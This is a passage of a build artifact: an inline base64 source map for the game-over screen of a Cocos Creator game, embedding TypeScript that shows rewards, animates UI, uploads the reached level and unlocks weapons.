//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZU92ZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLDJEQUFzRDtBQUN0RCwyREFBcUQ7QUFDckQseUNBQXNDO0FBQ3RDLHVDQUFvQztBQUNwQyxpREFBNEM7QUFDNUMsOENBQXlDO0FBQ3pDLHlEQUFzRDtBQUN0RCxxRUFBa0U7QUFDbEUsNkRBQTBEO0FBRTFELHlFQUF5RTtBQUNuRSxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFzQyw0QkFBWTtJQUFsRDtRQUFBLHFFQXdLQztRQXJLRyxnQkFBVSxHQUFZLElBQUksQ0FBQztRQUczQixhQUFPLEdBQVcsSUFBSSxDQUFDO1FBR3ZCLGVBQVMsR0FBWSxJQUFJLENBQUM7UUFHMUIsb0JBQWMsR0FBWSxJQUFJLENBQUM7UUFHL0IsbUJBQWEsR0FBWSxJQUFJLENBQUM7UUFHOUIsc0JBQWdCLEdBQWtCLElBQUksQ0FBQztRQUd2QyxtQkFBYSxHQUFpQixJQUFJLENBQUM7UUFHbkMsbUJBQWEsR0FBVyxJQUFJLENBQUM7UUFHN0Isc0JBQWdCLEdBQVcsSUFBSSxDQUFDO1FBR2hDLHFCQUFlLEdBQVcsSUFBSSxDQUFDO1FBRy9CLHNCQUFnQixHQUFhLElBQUksQ0FBQztRQUdsQyx1QkFBaUIsR0FBa0IsSUFBSSxDQUFDO1FBR3hDLHNCQUFnQixHQUFrQixJQUFJLENBQUM7UUFHL0Isa0JBQVksR0FBRyxDQUFDLENBQUM7UUFFakIsZUFBUyxHQUFHLENBQUMsQ0FBQzs7SUE0SDFCLENBQUM7SUExSEcseUJBQU0sR0FBTjtRQUFBLGlCQVFDO1FBUEcsSUFBSSxDQUFDLGFBQWEsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsZ0JBQWdCLEVBQUU7WUFDdkQsS0FBSSxDQUFDLGVBQWUsQ0FBQyxNQUFNLENBQUMs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LENBQUMsV0FBVyxDQUFDO3NEQUNjO0lBR3ZDO1FBREMsUUFBUSxDQUFDLHVCQUFhLENBQUM7bURBQ1c7SUFHbkM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzttREFDVztJQUc3QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO3NEQUNjO0lBR2hDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7cURBQ2E7SUFHL0I7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQztzREFDYztJQUdsQztRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsV0FBVyxDQUFDO3VEQUNlO0lBR3hDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxXQUFXLENBQUM7c0RBQ2M7SUF2Q3RCLFFBQVE7UUFENUIsT0FBTztPQUNhLFFBQVEsQ0F3SzVCO0lBQUQsZUFBQztDQXhLRCxBQXdLQyxDQXhLcUMsRUFBRSxDQUFDLFNBQVMsR0F3S2pEO2tCQXhLb0IsUUFBUSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9leHRlbmQvRXh0ZW5kXCI7XHJcbmltcG9ydCB7R2FtZVByb3h5fSBmcm9tIFwiLi9HYW1lUHJveHlcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uL2luZm8vV29ybGRcIjtcclxuaW1wb3J0IEdhbWVPdmVyTHVja3kgZnJvbSBcIi4vR2FtZU92ZXJMdWNreVwiO1xyXG5pbXBvcnQgTmV0d29yayBmcm9tIFwiLi4vbmV0d29yay9OZXR3b3JrXCI7XHJcbmltcG9ydCB7TmV0d29ya0NvbmZpZ30gZnJvbSBcIi4uL2NvbmZpZy9OZXR3b3JrQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5cclxuLy9jdXJUaW1lID0gODAgIHN1YlRpbWUgPSAwLjYgICBhZGRUaW1lID0gMTAgIG1heCA9IDEwMCAgIDfmrKHvvIznrKw45qyh5Ye66K+v54K5YmFubmVyXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgR2FtZU92ZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIHRpdGxlTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdG9wTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICBnb2xkTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIHZpZGVvR29sZExhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICB2aWRlb011bExhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUHJvZ3Jlc3NCYXIpXHJcbiAgICBsdWNreVByb2dyZXNzQmFyOmNjLlByb2dyZXNzQmFyID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoR2FtZU92ZXJMdWNreSlcclxuICAgIGdhbWVPdmVyTHVja3k6R2FtZU92ZXJMdWNreSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBvbmVCdXR0b25Ob2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdHJpcGxlQnV0dG9uTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGx1Y2t5QnV0dG9uTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgbHVja3lWaWRlb1Nwcml0ZTpjYy5TcHJpdGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5TcHJpdGVGcmFtZSlcclxuICAgIGludml0ZVNwcml0ZUZyYW1lOmNjLlNwcml0ZUZyYW1lID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlRnJhbWUpXHJcbiAgICB2aWRlb1Nwcml0ZUZyYW1lOmNjLlNwcml0ZUZyYW1lID0gbnVsbDtcclxuXHJcblxyXG4gICAgcHJpdmF0ZSBfdGFrZUdvbGRPbmUgPSAwO1xyXG5cclxuICAgIHByaXZhdGUgX3ZpZGVvTXVsID0gMztcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLm9uZUJ1dHRvbk5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuUE9TSVRJT05fQ0hBTkdFRCwgKCk9PntcclxuICAgICAgICAgICB0aGlzLmx1Y2t5QnV0dG9uTm9kZS5wYXJlbnQucG9zaXRpb24gPSB0aGlzLm9uZUJ1dHRvbk5vZGUucG9zaXRpb24uYWRkKGNjLnYyKDAsIDEyMCkpO1xyXG4gICAgICAgIH0pO1xyXG5cclxuICAgICAgICBjYy5nYW1lLm9uKFwidmlkZW9fNVwiLCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMub25HYW1lT3ZlclRha2VEYWppYW5nRG8oKVxyXG4gICAgICAgIH0sdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25FbmFibGUgKCkge1xyXG4gICAgICAgIHRoaXMuX3Rha2VHb2xkT25lID0gMDtcclxuICAgICAgICB0aGlzLl92aWRlb011bCA9IDM7XHJcbiAgICAgICAgdGhpcy5nYW1lT3Zlckx1Y2t5Lm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5nYW1lT3Zlckx1Y2t5Lm5vZGUuekluZGV4ID0gMTA7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCJHYW1lT3Zlcj09PT5HYW1lUHJveHkucGF1c2VHYW1lID0gdHJ1ZVwiKTtcclxuICAgICAgICBHYW1lUHJveHkucGF1c2VHYW1lID0gdHJ1ZTtcclxuICAgICAgICAvLyB0aGlzLm9uZUJhY2tncm91bmRTcHJpdGUuc2V0TWF0ZXJpYWwoMCwgY2MuTWF0ZXJpYWwuZ2V0QnVpbHRpbk1hdGVyaWFsKFwiMmQtZ3JheS1zcHJpdGVcIikpO1xyXG4gICAgICAgIHRoaXMubm9kZS5jaGlsZHJlbi5mb3JFYWNoKCh2YWx1ZSwgaW5kZXgpID0+IHtcclxuICAgICAgICAgICAgdmFsdWUuc2NhbGUgPSAwO1xyXG4gICAgICAgICAgICB2YWx1ZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDErMC4wOCppbmRleCksIGNjLnNjYWxlVG8oMC4yLCAxKS5lYXNpbmcoY2MuZWFzZUVsYXN0aWNPdXQoMC40NSkpKSk7XHJcbiAgICAgICAgfSk7XHJcblxyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UudW5sb2NrR3VuID0gLVdvcmxkLlN0b3JhZ2UudW5sb2NrR3VuO1xyXG4gICAgICAgIHRoaXMudG9wTm9kZS5yZW1vdmVGcm9tUGFyZW50KGZhbHNlKTtcclxuICAgICAgICB0aGlzLm5vZGUuYWRkQ2hpbGQodGhpcy50b3BOb2RlKTtcclxuICAgICAgICB0aGlzLnRvcE5vZGUuZ2V0Q2hpbGRCeU5hbWUoJ3Byb2dyZXNzJykucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwLjMpLCBjYy5tb3ZlQnkoMC4zNSwgY2MudjIoMCwgLTEyNSkpKSk7XHJcbiAgICAgICAgdGhpcy50b3BOb2RlLmdldENoaWxkQnlOYW1lKCdsZXZlbCcpLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoMC43KSwgY2Muc3Bhd24oY2Muc2NhbGVUbygwLjM1LCAyKS5lYXNpbmcoY2MuZWFzZUVsYXN0aWNPdXQoMC42KSksIGNjLm1vdmVCeSgwLjM1LCBjYy52MigwLCAtOTUpKS5lYXNpbmcoY2MuZWFzZUVsYXN0aWNPdXQoMC42KSkpKSk7XHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5raWxsQ291bnQgPj0gR2FtZVByb3h5Lm1heEVuZW15TnVtKXtcclxuICAgICAgICAgICAgLy8gV29ybGQuU3RvcmFnZS5wYXNzTHVja3lDb3VudCsrO1xyXG4gICAgICAgICAgICBHYW1lUHJveHkuZ29sZENvdW50ICs9IEdhbWVQcm94eS5wYXNzR29sZCgpO1xyXG4gICAgICAgICAgICBXb3JsZC5TdG9yYWdlLmdhbWVMZXZlbCsrO1xyXG4gICAgICAgICAgICAvKiog5LiK5Lyg5YWz5Y2hICovXHJcbiAgICAgICAgICAgIGlmIChOZXR3b3JrQ29uZmlnLmNvbm5lY3RTZXJ2ZXIpe1xyXG4gICAgICAgICAgICAgICAgTmV0d29yay51cGxvYWRMdihXb3JsZC5TdG9yYWdlLmdhbWVMZXZlbCk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgLyoqIOiuoeeul+ino+mUgeacgOaWsOeahOS4gOaKiuaeqiAqL1xyXG4gICAgICAgICAgICBsZXQgd2VhcG9uQ29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKTtcclxuICAgICAgICAgICAgZm9yIChsZXQgaXRlbSBvZiB3ZWFwb25Db25maWcpe1xyXG4gICAgICAgICAgICAgICAgaWYgKGl0ZW1bJ3VubG9jayddID09IFdvcmxkLlN0b3JhZ2UuZ2FtZUxldmVsKXtcclxuICAgICAgICAgICAgICAgICAgICBXb3JsZC5TdG9yYWdlLnVubG9ja0d1biA9IGl0ZW1bJ2lkJ107XHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHRoaXMudGl0bGVMYWJlbC5zdHJpbmcgPSBcIuaImOaWl+Wksei0pVwiO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLl90YWtlR29sZE9uZSA9IEdhbWVQcm94eS5nb2xkQ291bnQ7XHJcbiAgICAgICAgdGhpcy5nb2xkTGFiZWwuc3RyaW5nID0gZXh0LnNob3J0Rm9ybWF0KHRoaXMuX3Rha2VHb2xkT25lKTtcclxuICAgICAgICB0aGlzLnRvcE5vZGUuZ2V0Q2hpbGRCeU5hbWUoJ3Byb2dyZXNzJykuZ2V0Q2hpbGRCeU5hbWUoJ2dvbGRMYWJlbCcpLmdldENvbXBvbmVudChjYy5MYWJlbCkuc3RyaW5nID0gdGhpcy5nb2xkTGFiZWwuc3RyaW5nO1xyXG4gICAgICAgIHRoaXMudXBkYXRlVmlkZW8oKTtcclxuICAgICAgICAvLyB0aGlzLm9uZUJ1dHRvbk5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgLy8gdGhpcy5zY2hlZHVsZU9uY2UoKCk9PnRoaXMub25lQnV0dG9uTm9kZS5hY3RpdmUgPSB0cnVlLCAyKTtcclxuICAgICAgICB0aGlzLnNjaGVkdWxlT25jZSgoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLmx1Y2t5QnV0dG9uTm9kZS5wYXJlbnQucnVuQWN0aW9uKGNjLnJlcGVhdEZvcmV2ZXIoY2Muc2VxdWVuY2UoY2Muc2NhbGVUbygwLjUsIDAuOTUpLCBjYy5zY2FsZVRvKDAuNSwgMSkpKSk7XHJcbiAgICAgICAgfSwgMik7XHJcbiAgICB9XHJcblxyXG4gICAgdXBkYXRlVmlkZW8oKXtcclxuICAgICAgICB0aGlzLnZpZGVvTXVsTGFiZWwuc3RyaW5nID0gYHgke3RoaXMuX3ZpZGVvTXVsfWA7XHJcbiAgICAgICAgdGhpcy52aWRlb0dvbGRMYWJlbC5zdHJpbmcgPSBleHQuc2hvcnRGb3JtYXQodGhpcy5fdGFrZUdvbGRPbmUgKiB0aGlzLl92aWRlb011bCk7XHJcbiAgICAgICAgdGhpcy5sdWNreVByb2